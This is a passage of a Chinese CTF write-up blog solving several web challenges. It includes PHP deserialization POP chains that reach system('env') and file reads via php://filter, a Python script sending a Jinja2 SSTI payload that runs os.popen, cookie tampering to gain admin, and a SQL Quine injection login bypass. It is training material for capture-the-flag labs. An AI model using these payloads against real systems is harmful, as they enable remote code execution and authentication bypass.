class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$leader</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$leader</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;leader = <span class=\"variable\">$leader</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hahaha</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name != <span class=\"string\">&#x27;one class&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable language_\">$this</span>-&gt;leader-&gt;name != <span class=\"string\">&#x27;ing&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable language_\">$this</span>-&gt;leader-&gt;rank != <span class=\"string\">&#x27;department&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> False;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> True;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">school</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$department</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$headmaster</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$department</span>, <span class=\"variable\">$ceo</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;department = <span class=\"variable\">$department</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;headmaster = <span class=\"variable\">$ceo</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IPO</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;headmaster == <span class=\"string\">&#x27;ong&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Pretty Good ! Ctfer!\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;a&#x27;</span>](<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;b&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;department-&gt;<span class=\"title function_ invoke__\">hahaha</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">IPO</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">school</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">classroom</span>(<span class=\"string\">&#x27;one class&#x27;</span>,<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">teacher</span>(<span class=\"string\">&#x27;ing&#x27;</span>,<span class=\"string\">&#x27;department&#x27;</span>)),<span class=\"string\">&#x27;ong&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>链子很好找，主要是 <code> echo new $_POST['a']($_POST['b']);</code>  怎么利用？<br>\na=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</p>\n<h3 id=\"23hznuctf-2023-preliminaryflask\"><a class=\"markdownIt-Anchor\" href=\"#23hznuctf-2023-preliminaryflask\">#</a> 23.[HZNUCTF 2023 preliminary]flask</h3>\n<p>此题将输入的内容倒置了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;7*7&#125;&#125;不行,&#125;&#125;7*7&#123;&#123;可以</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node2.anna.nssctf.cn:28463/?name=&#x27;</span>  </span><br><span class=\"line\"><span class=\"built_in\">str</span>=<span class=\"string\">&#x27;&#x27;&#x27;&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read())%&#125;&#x27;&#x27;&#x27;</span>  </span><br><span class=\"line\">payload=<span class=\"built_in\">str</span>[::-<span class=\"number\">1</span>]  </span><br><span class=\"line\">url+=payload  </span><br><span class=\"line\">r=requests.get(url=url)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<p>什么是 env?</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env 是一个用于显示系统环境变量的命令行工具。在不带参数的情况下，它会列出当前 shell 中所有的环境变量。通过使用该命令，可以查看操作系统中设置的环境变量，以及对它们进行增加、修改、删除等操作。</span><br></pre></td></tr></table></figure>\n<h3 id=\"24hznuctf-2023-preliminaryppppop\"><a class=\"markdownIt-Anchor\" href=\"#24hznuctf-2023-preliminaryppppop\">#</a> 24.[HZNUCTF 2023 preliminary]ppppop</h3>\n<p>打开什么也没有，抓包看一下，发现 cookie 处</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: user=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9</span><br><span class=\"line\"></span><br><span class=\"line\">base64解码之后是:</span><br><span class=\"line\">O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;</span><br><span class=\"line\">把b:0改成b:1然后base64编码改成新的cookie发包,就能看见内容</span><br></pre></td></tr></table></figure>\n<p>php 代码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;utils.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$className</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$funcName</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$args</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span> = <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;className;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$funcName</span> = <span class=\"variable language_\">$this</span>-&gt;funcName;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span>-&gt;<span class=\"variable\">$funcName</span>(<span class=\"variable language_\">$this</span>-&gt;args);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$func</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">checkUser</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$payload</span> = <span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;payload&#x27;</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$payload</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;utils.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$className</span>=<span class=\"string\">&quot;B&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$funcName</span>=<span class=\"string\">&#x27;system&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$args</span>=<span class=\"string\">&#x27;env&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span> = <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;className;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$funcName</span> = <span class=\"variable language_\">$this</span>-&gt;funcName;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$class</span>-&gt;<span class=\"variable\">$funcName</span>(<span class=\"variable language_\">$this</span>-&gt;args);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$func</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">A</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">/*post传:</span></span><br><span class=\"line\"><span class=\"comment\">payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnM7IkIiOjE6czsiZW1hTnNzYWxjIjo5OnN7OjM6IkEiOjE6Tw==*/</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"25hdctf-2023loginmaster\"><a class=\"markdownIt-Anchor\" href=\"#25hdctf-2023loginmaster\">#</a> 25.[HDCTF 2023]LoginMaster</h3>\n<p>通过 dirsearch 扫到 robots.txt, 打开发现过滤了一些东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkSql($s) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;</span><br><span class=\"line\">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class=\"line\">        die($FLAG);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure>\n<p><code>Quine</code>  又叫做自产生程序，在 <code>sql</code>  注入技术中，这是一种使得输入的 <code>sql</code>  语句和输出的 <code>sql</code>  语句一致的技术，常用于一些特殊的登陆绕过 <code>sql</code>  注入中</p>\n<p>首先时间盲注发现这是一个空表</p>\n<p>时间盲注可以看看这篇:<a href=\"https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/\"> 来呀</a></p>\n<h4 id=\"quine注入\"><a class=\"markdownIt-Anchor\" href=\"#quine注入\">#</a> Quine 注入</h4>\n<h5 id=\"replace函数\"><a class=\"markdownIt-Anchor\" href=\"#replace函数\">#</a> replace () 函数</h5>\n<p>replace(object,search,replace)<br>\n 把 object 对象中出现的 search 全部替换成 replac, 然后返回替换后的结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(&quot;.&quot;,char(46),&quot;.&quot;);</span><br><span class=\"line\">这里的char(46)等于.</span><br><span class=\"line\">将&quot;.&quot;里的.换成.并返回替换的结果.</span><br><span class=\"line\"></span><br><span class=\"line\">select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class=\"line\">结果为:</span><br><span class=\"line\">replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">replace(‘replace(&quot;.&quot;,char(46),&quot;.&quot;)’,char(46),‘replace(&quot;.&quot;,char(46),&quot;.&quot;)’)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">replace(“replace(”.&quot;,char(46),&quot;.&quot;)&quot;,char(46),“replace(”.&quot;,char(46),&quot;.&quot;)&quot;)</td>\n</tr>\n</tbody>\n</table>\n<p>原因：第三个参数把第一个参数的。换成 replace (&quot;.&quot;,char (46),&quot;.&quot;)<br>\n 但是此时变成了双引号，我们换成单引号才能保证输入输出一样，char (34) 为 &quot; char (46) 为’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39)),char(46),&quot;.&quot;);</span><br><span class=\"line\">将&quot;.&quot;的&quot;换成&#x27;,然后将.换成.</span><br><span class=\"line\">结果是:&#x27;.&#x27;</span><br><span class=\"line\">那么就可以这样构造:</span><br></pre></td></tr></table></figure>\n<p>最终:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>\n<p>过程：看最外面的 replace 函数<br>\n replace (‘replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;)’,char (34),char (39)) 里面的 char (46) 也就是。换成 replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;) 就是:</p>\n<p>replace(‘replace(replace(“replace(replace(”.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;,char(34),char(39)),char(46),“replace(replace(”.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;)’,char(34),char(39))</p>\n<p>然后就是把 replace (replace (“replace (replace (”.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;,char (34),char (39)),char (46),“replace (replace (”.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;) 里面的 char (34) 也就是双引号换成 char (39) 单引号，就是:</p>\n<p>replace(replace(‘replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)’,char(34),char(39)),char(46),‘replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)’)<br>\n 就变回了原样</p>\n<h5 id=\"quine基本形式\"><a class=\"markdownIt-Anchor\" href=\"#quine基本形式\">#</a> Quine 基本形式</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure>\n<p>那么 str 基本形式:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;union/**/select/**/replace(replace(&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>\n<h3 id=\"26hznuctf-2023-preliminaryezlogin\"><a class=\"markdownIt-Anchor\" href=\"#26hznuctf-2023-preliminaryezlogin\">#</a> 26.[HZNUCTF 2023 preliminary]ezlogin</h3>\n<p>查看源代码发现这个注释:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">$username = strrev(base64_decode($_POST[&#x27;username&#x27;]));</span></span><br><span class=\"line\"><span class=\"comment\">$username = preg_replace(&#x27;/select|union|and|database/&#x27;, &quot;hznuctf2023&quot;, $username);--&gt;</span></span><br></pre></td></tr></table></figure>\n<p>写段 php 来测试页面</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&quot;1&#x27;||if(1,sleep(5),1)#&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">strrev</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\"></span><br><span 